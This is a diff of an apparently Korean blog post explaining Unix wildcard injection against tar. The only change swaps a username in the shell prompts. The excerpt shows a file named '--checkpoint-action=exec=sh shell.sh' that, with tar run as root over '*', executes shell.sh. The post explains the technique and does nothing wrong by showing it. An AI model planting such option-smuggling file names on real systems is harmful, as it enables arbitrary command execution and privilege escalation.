@@ -201,7 +201,7 @@ drwxr-xr-x  31 hahwul  hahwul  992 Nov 30 21:51 ..
 </code></pre>
 <p>(만약 이게 됬다면 wildcard 쓰는거 자체가 어마무시하게 위험한 행위가 되었을지도요..)</p>
 <p>아무튼 우린 옵션 데이터 정도를 넘겨줄 수 있는데요, 이를 이용한 대표적인 사례가 tar(압축관리)에 대한 공격입니다.</p>
-<pre><code>root@PIXN:/home/hahwul/PIXN/test/1# ll
+<pre><code>root@PIXN:/home/researcher/PIXN/test/1# ll
 total 28
 drwxr-xr-x 2 root root  4096 Dec  1 20:36  ./
 drwxr-xr-x 4 root root  4096 Dec  1 22:37  ../
@@ -209,7 +209,7 @@ drwxr-xr-x 4 root root  4096 Dec  1 22:37  ../
 -rw-r--r-- 1 root root     1 Dec  1 20:36 '--checkpoint-action=exec=sh shell.sh'
 -rwxrwxrwx 1 root root    11 Dec  1 20:36  shell.sh*
 
-root@PIXN:/home/hahwul/PIXN/test/1# tar -cvf 123.tar *
+root@PIXN:/home/researcher/PIXN/test/1# tar -cvf 123.tar *
 shell.sh
 run!!
 </code></pre>
